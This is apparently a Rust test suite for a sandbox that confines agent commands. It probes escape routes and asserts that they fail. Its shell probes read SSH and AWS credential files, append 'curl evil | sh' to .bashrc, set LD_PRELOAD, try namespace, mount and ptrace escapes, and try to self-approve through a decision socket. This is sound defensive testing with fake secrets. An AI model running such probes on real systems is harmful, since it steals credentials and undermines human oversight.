//! The escape suite: every test tries to do something the threat model says
//! a sandboxed process must not be able to do, and asserts that it fails
//! closed. Tests are named after threat-model ids (`docs/threat-model.md`).
//!
//! Fixtures are benign: fake keys with obvious markers, and no network
//! destination other than loopback.
//!
//! On a host where no backend is available every test prints
//! `UNTESTED ON THIS HOST` instead of passing silently. Set
//! `AGENTKEEP_REQUIRE_SANDBOX=1` (as Linux CI does) to turn that into a
//! failure.
//!
//! `AGENTKEEP_ESCAPE_BACKEND=<name>` runs the suite against one backend
//! (`linux`, `container`, `macos`); otherwise the first available one is
//! used. Each test names the controls it exercises, and a backend that does
//! not claim a control (per `agentkeep doctor --json`) gets a
//! `NOT APPLICABLE` line for it instead of a pass. Universal assertions
//! (secrets never leak, the host is never modified) run on every backend.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

/// True when CI demands that the sandbox really runs. An empty value counts
/// as unset so a matrix expression can clear it on other platforms.
fn require_sandbox() -> bool {
    std::env::var("AGENTKEEP_REQUIRE_SANDBOX").is_ok_and(|v| !v.trim().is_empty())
}

#[cfg(unix)]
mod suite {
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use std::path::{Path, PathBuf};
    use std::process::{Command, Output};
    use std::sync::OnceLock;

    use super::require_sandbox;

    const FAKE_SSH_KEY: &str = "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKE_TEST_KEY_NOT_REAL_agentkeep_escape_suite\n-----END OPENSSH PRIVATE KEY-----\n";
    const FAKE_AWS: &str = "[default]\naws_access_key_id = AKIA_TEST_FAKE_NOT_REAL\naws_secret_access_key = FAKE_TEST_SECRET_agentkeep\n";
    const FAKE_ENV_SECRET: &str = "sk-test-fake-agentkeep-escape-suite";

    /// Host-side configuration of the container runtime CLI, passed through
    /// to `agentkeep run` when set.
    const RUNTIME_ENV: &[&str] = &[
        "AGENTKEEP_CONTAINER_RUNTIME",
        "CONTAINERS_CONF",
        "CONTAINER_HOST",
        "DOCKER_HOST",
        "DOCKER_CONFIG",
        "DOCKER_CONTEXT",
        "XDG_RUNTIME_DIR",
        "XDG_DATA_HOME",
        "XDG_CONFIG_HOME",
    ];

    fn bin() -> &'static str {
        env!("CARGO_BIN_EXE_agentkeep")
    }

    /// A fake home with planted secrets and a project directory.
    pub struct Harness {
        pub _root: tempfile::TempDir,
        pub home: PathBuf,
        pub project: PathBuf,
        /// Backend under test.
        pub backend: String,
        /// Controls it claims.
        pub controls: Vec<String>,
        /// Pass `--backend` explicitly.
        pub forced: bool,
    }

    impl Harness {
        /// Does the backend under test claim this control?
        pub fn claims(&self, control: &str) -> bool {
            self.controls.iter().any(|c| c == control)
        }

        /// Gate a test on a control. Prints `NOT APPLICABLE` and returns
        /// false when the backend does not claim it.
        pub fn requires(&self, id: &str, control: &str) -> bool {
            if self.claims(control) {
                return true;
            }
            let msg = format!(
                "NOT APPLICABLE [{id}] on backend `{}`: it does not claim `{control}` (see docs/limitations.md)",
                self.backend
            );
            println!("{msg}");
            eprintln!("{msg}");
            false
        }

        fn new(backend: &str, controls: &[String], forced: bool) -> Self {
            let root = tempfile::tempdir().unwrap();
            let home = root.path().join("home");
            let project = root.path().join("home/work/project");
            fs::create_dir_all(home.join(".ssh")).unwrap();
            fs::write(home.join(".ssh/id_ed25519"), FAKE_SSH_KEY).unwrap();
            fs::set_permissions(
                home.join(".ssh/id_ed25519"),
                fs::Permissions::from_mode(0o600),
            )
            .unwrap();
            fs::create_dir_all(home.join(".aws")).unwrap();
            fs::write(home.join(".aws/credentials"), FAKE_AWS).unwrap();
            fs::create_dir_all(home.join("other-project")).unwrap();
            fs::write(
                home.join("other-project/secret.txt"),
                "FAKE_OTHER_PROJECT_SECRET",
            )
            .unwrap();
            fs::write(home.join(".bashrc"), "# original\n").unwrap();
            fs::create_dir_all(&project).unwrap();
            fs::write(project.join("README.md"), "hello\n").unwrap();
            Command::new("git")
                .arg("init")
                .arg("-q")
                .current_dir(&project)
                .output()
                .ok();
            Self {
                _root: root,
                home,
                project,
                backend: backend.to_string(),
                controls: controls.to_vec(),
                forced,
            }
        }

        /// Run a shell snippet inside the sandbox. `extra_policy` is written
        /// to the project's agentkeep.toml (after `schema = 1`).
        pub fn run(&self, extra_policy: &str, script: &str) -> Output {
            if extra_policy.is_empty() {
                let _ = fs::remove_file(self.project.join("agentkeep.toml"));
            } else {
                fs::write(
                    self.project.join("agentkeep.toml"),
                    format!("schema = 1\n{extra_policy}"),
                )
                .unwrap();
            }
            let mut args = vec!["--no-ask", "run"];
            if self.forced {
                args.extend(["--backend", self.backend.as_str()]);
            }
            args.extend(["--", "sh", "-c", script]);
            let mut cmd = Command::new(bin());
            cmd.args(&args)
                .current_dir(&self.project)
                .env_clear()
                .env("HOME", &self.home)
                .env("PATH", std::env::var("PATH").unwrap_or_default())
                .env("USER", "escapetester")
                .env("FAKE_SECRET_TOKEN", FAKE_ENV_SECRET)
                .env("LD_PRELOAD", "/nonexistent/evil.so")
                .env("TERM", "dumb");
            // The container backend's runtime CLI runs on the host side and
            // needs its own configuration (which runtime, where the daemon
            // or rootless storage is). The default env policy scrubs all of
            // these before the sandbox, so they never reach the command.
            for name in RUNTIME_ENV {
                if let Some(v) = std::env::var_os(name) {
                    cmd.env(name, v);
                }
            }
            cmd.output().expect("spawn agentkeep")
        }
    }

    fn out(o: &Output) -> String {
        format!(
            "{}{}",
            String::from_utf8_lossy(&o.stdout),
            String::from_utf8_lossy(&o.stderr)
        )
    }

    /// Backend chosen for this run: name, claimed controls, forced flag.
    type Selection = Result<(String, Vec<String>, bool), String>;

    #[allow(clippy::single_match_else)] // both arms are substantial
    fn select_backend() -> Selection {
        let o = Command::new(bin())
            .args(["doctor", "--json"])
            .output()
            .expect("run agentkeep doctor");
        let report: serde_json::Value = serde_json::from_slice(&o.stdout)
            .map_err(|e| format!("doctor --json unreadable: {e}"))?;
        let wanted = std::env::var("AGENTKEEP_ESCAPE_BACKEND")
            .ok()
            .filter(|v| !v.trim().is_empty());
        let backends = report["backends"].as_array().cloned().unwrap_or_default();
        let pick = backends.iter().find(|b| {
            b["available"] == true
                && wanted
                    .as_deref()
                    .is_none_or(|w| b["name"].as_str() == Some(w))
        });
        match pick {
            Some(b) => {
                let name = b["name"].as_str().unwrap_or_default().to_string();
                let controls = b["controls"]
                    .as_array()
                    .map(|a| {
                        a.iter()
                            .filter_map(|c| c.as_str().map(String::from))
                            .collect()
                    })
                    .unwrap_or_default();
                println!("escape suite: backend `{name}`, controls {controls:?}");
                Ok((name, controls, wanted.is_some()))
            }
            None => {
                let reasons: Vec<String> = backends
                    .iter()
                    .map(|b| format!("{}: {}", b["name"], b["reason"]))
                    .collect();
                Err(match wanted {
                    Some(w) => format!("backend `{w}` unavailable ({})", reasons.join("; ")),
                    None => format!("no sandbox backend available ({})", reasons.join("; ")),
                })
            }
        }
    }

    /// `Some(harness)` when a backend works here, `None` otherwise.
    pub fn harness(id: &str) -> Option<Harness> {
        static SELECTED: OnceLock<Selection> = OnceLock::new();
        match SELECTED.get_or_init(select_backend) {
            Ok((name, controls, forced)) => Some(Harness::new(name, controls, *forced)),
            Err(reason) => {
                let msg = format!("UNTESTED ON THIS HOST [{id}]: {reason}");
                println!("{msg}");
                eprintln!("{msg}");
                assert!(
                    !require_sandbox(),
                    "AGENTKEEP_REQUIRE_SANDBOX is set but the sandbox is unavailable: {reason}"
                );
                None
            }
        }
    }

    /// "No such file", "Operation not permitted" or "Permission denied":
    /// the access failed, whichever way the backend refuses it.
    fn refused(text: &str) -> bool {
        [
            "No such file",
            "Operation not permitted",
            "Permission denied",
        ]
        .iter()
        .any(|m| text.contains(m))
    }

    fn has(tool: &str) -> bool {
        Command::new("sh")
            .args(["-c", &format!("command -v {tool}")])
            .output()
            .is_ok_and(|o| o.status.success())
    }

    /// Assert that a probe failed and leaked nothing.
    fn assert_blocked(o: &Output, forbidden: &[&str], ctx: &str) {
        let text = out(o);
        for f in forbidden {
            assert!(!text.contains(f), "{ctx}: leaked `{f}`:\n{text}");
        }
    }

    // ---- F: filesystem ------------------------------------------------

    #[test]
    fn f1_ssh_and_cloud_credentials_are_absent() {
        let Some(h) = harness("F1") else { return };
        let o = h.run(
            "",
            "cat ~/.ssh/id_ed25519; cat ~/.aws/credentials; ls -la ~/.ssh ~/.aws; echo rc=$?",
        );
        assert_blocked(
            &o,
            &["FAKE_TEST_KEY", "AKIA_TEST_FAKE", "FAKE_TEST_SECRET"],
            "F1",
        );
        assert!(refused(&out(&o)), "{}", out(&o));
        if h.requires("F1 absent", "fs_absent") {
            assert!(out(&o).contains("No such file"), "{}", out(&o));
        }
    }

    #[test]
    fn f1_hidden_paths_under_a_visible_tree_stay_hidden() {
        // A policy makes ~/.config visible; the built-in hidden entries
        // inside it (a directory and a file) must still show nothing. This
        // is the case where the hidden overlay lies over real content.
        let Some(h) = harness("F1 hidden") else {
            return;
        };
        fs::create_dir_all(h.home.join(".config/gh")).unwrap();
        fs::write(
            h.home.join(".config/gh/hosts.yml"),
            "oauth_token: ghp_FAKE_TEST_TOKEN_agentkeep\n",
        )
        .unwrap();
        fs::write(
            h.home.join(".config/hub"),
            "oauth_token: FAKE_HUB_TOKEN_agentkeep\n",
        )
        .unwrap();
        fs::write(h.home.join(".config/visible.txt"), "VISIBLE_CONFIG\n").unwrap();
        let o = h.run(
            "[filesystem]\nread_only = [\"~/.config\"]\n",
            "cat ~/.config/visible.txt; ls -A ~/.config/gh; echo ls-rc=$?; cat ~/.config/gh/hosts.yml; cat ~/.config/hub; echo done",
        );
        let text = out(&o);
        assert_blocked(
            &o,
            &["ghp_FAKE_TEST_TOKEN", "FAKE_HUB_TOKEN", "hosts.yml\n"],
            "F1 hidden",
        );
        assert!(text.contains("VISIBLE_CONFIG"), "{text}");
        assert!(text.contains("done"), "{text}");
        if h.requires("F1 hidden empty", "fs_absent") {
            // The hidden directory exists and is empty.
            assert!(text.contains("ls-rc=0"), "{text}");
        }
    }

    #[test]
    fn f2_other_directories_in_home_are_absent() {
        let Some(h) = harness("F2") else { return };
        let o = h.run("", "cat ~/other-project/secret.txt; ls ~");
        assert_blocked(&o, &["FAKE_OTHER_PROJECT_SECRET"], "F2");
        let listed = out(&o).lines().any(|l| l.trim() == "other-project");
        assert!(!listed, "other-project listed in home:\n{}", out(&o));
    }

    #[test]
    fn f3_symlink_and_hardlink_tricks_fail() {
        let Some(h) = harness("F3") else { return };
        // Symlink created on the host pointing at the secret.
        std::os::unix::fs::symlink(
            h.home.join(".ssh/id_ed25519"),
            h.project.join("link-to-key"),
        )
        .unwrap();
        let o = h.run(
            "",
            "cat ./link-to-key; ln -s ~/.aws/credentials ./link2 && cat ./link2; ln ~/.ssh/id_ed25519 ./hardlink; echo ln-rc=$?; cat ./hardlink",
        );
        assert_blocked(&o, &["FAKE_TEST_KEY", "AKIA_TEST_FAKE"], "F3");
        if h.requires("F3 hardlink", "hardlink_safe") {
            assert!(
                !h.project.join("hardlink").exists(),
                "hardlink must not be created"
            );
        }
    }

    #[test]
    fn f4_host_processes_are_invisible() {
        let Some(h) = harness("F4") else { return };
        if !h.requires("F4", "pid_isolation") {
            return;
        }
        let supervisor_pid = std::process::id();
        let o = h.run("", &format!("ls /proc | grep -c '^[0-9]'; test -d /proc/{supervisor_pid} && echo HOST_PID_VISIBLE; cat /proc/1/cmdline | tr '\\0' ' '; ls /proc/1/root/ 2>&1 | head -3"));
        let text = out(&o);
        assert!(!text.contains("HOST_PID_VISIBLE"), "{text}");
        let count: usize = text
            .lines()
            .next()
            .and_then(|l| l.trim().parse().ok())
            .unwrap_or(999);
        assert!(count < 10, "too many pids visible ({count}):\n{text}");
        assert!(
            text.contains("agentkeep"),
            "pid 1 should be agentkeep's init:\n{text}"
        );
    }

    #[test]
    fn f5_ptrace_and_process_memory_access_are_denied() {
        let Some(h) = harness("F5") else { return };
        if !h.requires("F5", "ptrace_denied") {
            return;
        }
        if !has("python3") {
            println!("UNTESTED [F5]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "",
            r#"python3 -c '
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
r = libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME
print("ptrace", r, os.strerror(ctypes.get_errno()))
r = libc.syscall(310, 1, None, 0, None, 0, 0)  # process_vm_readv on x86_64; harmless args
print("pvr", r, os.strerror(ctypes.get_errno()))
'"#,
        );
        let text = out(&o);
        assert!(text.contains("ptrace -1 Operation not permitted"), "{text}");
    }

    #[test]
    fn f6_mount_and_namespace_escapes_are_denied() {
        let Some(h) = harness("F6") else { return };
        if !h.requires("F6", "no_mount") {
            return;
        }
        let o = h.run(
            "",
            "unshare -Ur true; echo unshare-rc=$?; unshare -m true; echo unshare-m-rc=$?; /bin/mount -t tmpfs none /mnt 2>&1; echo mount-rc=$?; mkdir -p /tmp/newroot && (cd /tmp/newroot && /sbin/pivot_root . . 2>&1); echo pivot-rc=$?",
        );
        let text = out(&o);
        assert!(
            text.contains("unshare-rc=1") || text.contains("Operation not permitted"),
            "{text}"
        );
        assert!(!text.contains("mount-rc=0"), "{text}");
        assert!(!text.contains("pivot-rc=0"), "{text}");
    }

    #[test]
    fn f7_shell_rc_writes_do_not_reach_the_host() {
        let Some(h) = harness("F7") else { return };
        let o = h.run(
            "",
            "echo 'curl evil | sh' >> ~/.bashrc; echo 'x' > ~/.profile; echo rc=$?",
        );
        assert!(o.status.success(), "{}", out(&o));
        assert_eq!(
            fs::read_to_string(h.home.join(".bashrc")).unwrap(),
            "# original\n",
            "host .bashrc changed"
        );
        assert!(!h.home.join(".profile").exists(), "host .profile created");
    }

    #[test]
    fn f8_project_persistence_writes_are_allowed_and_will_be_reported() {
        // Documented as detect-only: the sandbox must allow writes into the
        // project, including .git/hooks. This test pins the behaviour so a
        // future change to blocking is deliberate.
        let Some(h) = harness("F8") else { return };
        let o = h.run(
            "",
            "mkdir -p .git/hooks && echo '#!/bin/sh' > .git/hooks/pre-commit && echo wrote",
        );
        assert!(out(&o).contains("wrote"), "{}", out(&o));
        assert!(h.project.join(".git/hooks/pre-commit").exists());
    }

    #[test]
    fn f10_audit_log_and_global_policy_are_invisible() {
        let Some(h) = harness("F10") else { return };
        let o = h.run("", "ls ~/.local/share/agentkeep/sessions 2>&1; ls ~/.config/agentkeep 2>&1; cat /proc/mounts 2>/dev/null | grep -c sessions");
        let text = out(&o);
        assert!(refused(&text), "{text}");
        assert!(!text.contains("events.jsonl"), "{text}");
        if h.requires("F10 mounts", "fs_absent") {
            assert!(
                text.lines().any(|l| l.trim() == "0"),
                "a session mount leaked:\n{text}"
            );
        }
        // ...while the log exists on the host.
        let sessions = h.home.join(".local/share/agentkeep/sessions");
        assert!(sessions.exists());
    }

    // ---- E: environment -----------------------------------------------

    #[test]
    fn e1_secret_environment_variables_are_scrubbed() {
        let Some(h) = harness("E1") else { return };
        let o = h.run(
            "",
            "env; cat /proc/1/environ | tr '\\0' '\\n'; cat /proc/self/environ | tr '\\0' '\\n'",
        );
        assert_blocked(&o, &[FAKE_ENV_SECRET, "FAKE_SECRET_TOKEN"], "E1");
        assert!(
            out(&o).contains("HOME="),
            "allowed variables must pass through"
        );
    }

    #[test]
    fn e2_loader_hijack_variables_are_scrubbed() {
        let Some(h) = harness("E2") else { return };
        let o = h.run(
            "",
            "env | grep -E '^(LD_PRELOAD|LD_LIBRARY_PATH)=' ; echo grep-rc=$?",
        );
        assert!(out(&o).contains("grep-rc=1"), "{}", out(&o));
    }

    // ---- N: network ---------------------------------------------------

    #[test]
    fn n3_n4_no_network_and_no_dns() {
        let Some(h) = harness("N3/N4") else { return };
        if !h.requires("N3/N4", "net_isolation") {
            return;
        }
        if h.requires("N3/N4 netns", "net_namespace") {
            let o = h.run(
                "",
                "getent hosts example.com; echo dns-rc=$?; cat /proc/net/dev | tail -n +3 | awk '{print $1}'; cat /proc/net/route | wc -l",
            );
            let text = out(&o);
            assert!(text.contains("dns-rc=2"), "{text}");
            let ifaces: Vec<&str> = text.lines().filter(|l| l.ends_with(':')).collect();
            assert_eq!(ifaces, vec!["lo:"], "only loopback may exist:\n{text}");
        }
        if has("python3") {
            let o = h.run("", "python3 -c 'import socket; s=socket.socket(); s.settimeout(2); s.connect((\"127.0.0.1\", 9)) if False else None; \ntry:\n s.connect((\"203.0.113.1\", 80)); print(\"CONNECTED\")\nexcept OSError as e: print(\"blocked\", e)'");
            assert!(!out(&o).contains("CONNECTED"), "{}", out(&o));
        }
    }

    // ---- C: commands and processes ------------------------------------

    #[test]
    fn c3_no_capabilities_and_no_new_privs() {
        let Some(h) = harness("C3") else { return };
        if !h.requires("C3", "no_caps") {
            return;
        }
        let o = h.run("", "grep -E '^(CapEff|CapPrm|CapBnd|CapAmb|NoNewPrivs):' /proc/self/status; id -u; sudo -n true 2>&1; echo sudo-rc=$?");
        let text = out(&o);
        for cap in [
            "CapEff:\t0000000000000000",
            "CapPrm:\t0000000000000000",
            "CapBnd:\t0000000000000000",
            "CapAmb:\t0000000000000000",
            "NoNewPrivs:\t1",
        ] {
            assert!(text.contains(cap), "missing `{cap}` in:\n{text}");
        }
        assert!(!text.contains("sudo-rc=0"), "{text}");
    }

    #[test]
    fn c4_resource_limits_are_applied() {
        let Some(h) = harness("C4") else { return };
        if h.claims("cgroup_limits") {
            c4_cgroup_limits(&h);
            return;
        }
        if !h.requires("C4", "rlimits") {
            return;
        }
        if !has("python3") {
            println!("UNTESTED [C4]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "[limits]\nmemory = \"512M\"\npids = 64\n",
            "python3 -c 'import resource; print(\"nproc\", resource.getrlimit(resource.RLIMIT_NPROC)); print(\"as\", resource.getrlimit(resource.RLIMIT_AS))'; cat /sys/fs/cgroup/memory.max 2>/dev/null",
        );
        let text = out(&o);
        let cgroup = text.lines().any(|l| l.trim() == "536870912");
        assert!(text.contains("nproc (64, 64)"), "{text}");
        assert!(
            cgroup || text.contains("as (536870912, 536870912)"),
            "{text}"
        );
    }

    /// Container runtimes enforce memory and pid limits with the
    /// container's cgroup, which is mounted read-only inside: read the
    /// limits the kernel holds (cgroup v2 or v1 layout), then run into the
    /// pid limit for real.
    fn c4_cgroup_limits(h: &Harness) {
        if !has("python3") {
            println!("UNTESTED [C4]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "[limits]\nmemory = \"512M\"\npids = 64\n",
            r#"for f in /sys/fs/cgroup/memory.max /sys/fs/cgroup/memory/memory.limit_in_bytes /sys/fs/cgroup/pids.max /sys/fs/cgroup/pids/pids.max; do [ -r "$f" ] && echo "$f=$(cat "$f")"; done
python3 -c '
import os, time
pids = []
try:
    for _ in range(200):
        p = os.fork()
        if p == 0:
            time.sleep(5)
            os._exit(0)
        pids.append(p)
except OSError as e:
    print("fork refused", e.errno)
print("forked", len(pids))
for p in pids:
    os.kill(p, 9)
'"#,
        );
        let text = out(&o);
        assert!(
            text.contains("memory.max=536870912")
                || text.contains("memory.limit_in_bytes=536870912"),
            "memory limit not in the cgroup:\n{text}"
        );
        assert!(
            text.contains("pids.max=64"),
            "pid limit not in the cgroup:\n{text}"
        );
        assert!(text.contains("fork refused 11"), "{text}");
        let forked: usize = text
            .lines()
            .find_map(|l| l.strip_prefix("forked "))
            .and_then(|n| n.trim().parse().ok())
            .unwrap_or(usize::MAX);
        assert!(forked < 64, "more processes than the limit:\n{text}");
    }

    #[test]
    fn c5_seccomp_is_active_and_denies_kernel_attack_surface() {
        let Some(h) = harness("C5") else { return };
        if !h.requires("C5", "seccomp") {
            return;
        }
        let o = h.run("", "grep -E '^Seccomp:' /proc/self/status");
        assert!(out(&o).contains("Seccomp:\t2"), "{}", out(&o));
        if has("python3") {
            let o = h.run(
                "",
                r#"python3 -c '
import ctypes, os, platform
libc = ctypes.CDLL(None, use_errno=True)
nr = {"x86_64": 425, "aarch64": 425}[platform.machine()]  # io_uring_setup
r = libc.syscall(nr, 8, None); print("io_uring", r, os.strerror(ctypes.get_errno()))
nr = {"x86_64": 321, "aarch64": 280}[platform.machine()]  # bpf
r = libc.syscall(nr, 0, None, 0); print("bpf", r, os.strerror(ctypes.get_errno()))
'"#,
            );
            let text = out(&o);
            assert!(
                text.contains("io_uring -1 Operation not permitted"),
                "{text}"
            );
            assert!(text.contains("bpf -1 Operation not permitted"), "{text}");
        }
    }

    #[test]
    fn c1_c2_command_rules_are_enforced_through_shims() {
        let Some(h) = harness("C1/C2") else { return };
        let o = h.run(
            "",
            "git status >/dev/null && echo status-ok; git push origin main; echo push-rc=$?; sudo true; echo sudo-rc=$?",
        );
        let text = out(&o);
        assert!(text.contains("status-ok"), "{text}");
        assert!(text.contains("push-rc=126"), "{text}");
        assert!(text.contains("sudo-rc=126"), "{text}");
    }

    #[test]
    fn b3_sandbox_cannot_become_its_own_approver() {
        // The decision socket is reachable from inside; registering as an
        // approver there must be refused, and asked commands stay denied.
        let Some(h) = harness("B3") else { return };
        if !has("python3") {
            println!("UNTESTED [B3]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "[approval]\ntransport = [\"socket\"]\ntimeout = \"3s\"\n",
            r#"python3 -c '
import os, socket
s = socket.socket(socket.AF_UNIX); s.connect(os.environ["AGENTKEEP_SOCKET"])
s.sendall(b"{\"kind\":\"approver\"}\n"); print("reply", s.recv(200).decode().strip())
'; ls /run/agentkeep 2>/dev/null; git push origin main; echo push-rc=$?"#,
        );
        let text = out(&o);
        assert!(
            text.contains("approvers must use the host socket"),
            "{text}"
        );
        assert!(
            !text.contains("approve.sock"),
            "host approver socket visible:\n{text}"
        );
        assert!(text.contains("push-rc=126"), "{text}");
    }

    // ---- S: agentkeep itself ------------------------------------------

    #[test]
    fn s1_project_policy_cannot_silently_unhide() {
        let Some(h) = harness("S1") else { return };
        // Without acknowledge: ignored, with a warning.
        let o = h.run(
            "[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nunhide = [\"~/.ssh\"]\n",
            "cat ~/.ssh/id_ed25519",
        );
        assert_blocked(&o, &["FAKE_TEST_KEY"], "S1 without acknowledge");
        assert!(out(&o).contains("acknowledge"), "{}", out(&o));
        // With acknowledge: allowed, but loudly.
        let o = h.run("[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nacknowledge = true\nunhide = [\"~/.ssh\"]\n", "cat ~/.ssh/id_ed25519");
        let text = out(&o);
        assert!(
            text.contains("FAKE_TEST_KEY"),
            "override should take effect:\n{text}"
        );
        assert!(text.contains("PROTECTION WEAKENED"), "{text}");
    }

    #[test]
    fn l1_audit_log_is_written_and_chain_verifies() {
        let Some(h) = harness("L-A1") else { return };
        let o = h.run("", "git push origin main; echo done");
        assert!(out(&o).contains("done"));
        let sessions = h.home.join(".local/share/agentkeep/sessions");
        let session = fs::read_dir(&sessions)
            .unwrap()
            .next()
            .unwrap()
            .unwrap()
            .path();
        let events = agentkeep_audit::verify(&session.join("events.jsonl")).unwrap();
        let kinds: Vec<&str> = events.iter().map(|e| e.kind.as_str()).collect();
        assert_eq!(kinds.first(), Some(&"session.start"));
        assert_eq!(kinds.last(), Some(&"session.end"));
        assert!(kinds.contains(&"exec"));
        assert!(kinds.contains(&"approval.request"));
        let start = &events[0].data;
        assert!(start["env_scrubbed_secrets"]
            .as_array()
            .unwrap()
            .iter()
            .any(|v| v == "FAKE_SECRET_TOKEN"));
        assert!(
            !serde_json::to_string(start)
                .unwrap()
                .contains(FAKE_ENV_SECRET),
            "secret value in log"
        );
    }

    // ---- positive controls --------------------------------------------

    #[test]
    fn positive_control_project_is_writable_and_tools_work() {
        let Some(h) = harness("control") else { return };
        let o = h.run("", "echo changed > README.md && ls /usr/bin | head -1 >/dev/null && git log --oneline -0 >/dev/null 2>&1; echo rc=$?; echo \"$HOME\" \"$USER\" \"$(pwd)\"");
        let text = out(&o);
        assert!(o.status.success(), "{text}");
        assert_eq!(
            fs::read_to_string(h.project.join("README.md")).unwrap(),
            "changed\n"
        );
        assert!(
            text.contains(&format!(
                "{} escapetester {}",
                h.home.display(),
                h.project.display()
            )),
            "{text}"
        );
    }

    #[test]
    fn positive_control_exit_codes_propagate() {
        let Some(h) = harness("control") else { return };
        let o = h.run("", "exit 42");
        assert_eq!(o.status.code(), Some(42), "{}", out(&o));
    }

    #[test]
    fn positive_control_wall_time_limit_kills_the_session() {
        let Some(h) = harness("C4 wall") else { return };
        let o = h.run("[limits]\nwall_time = \"2s\"\n", "sleep 30; echo SURVIVED");
        let text = out(&o);
        assert!(!text.contains("SURVIVED"), "{text}");
        assert_eq!(o.status.code(), Some(124), "{text}");
        let _ = Path::new("/");
    }
}

#[cfg(not(unix))]
#[test]
fn untested_on_this_host() {
    println!(
        "UNTESTED ON THIS HOST: the escape suite runs on Unix only; Windows uses WSL2 (Phase 2)"
    );
    assert!(!require_sandbox());
}
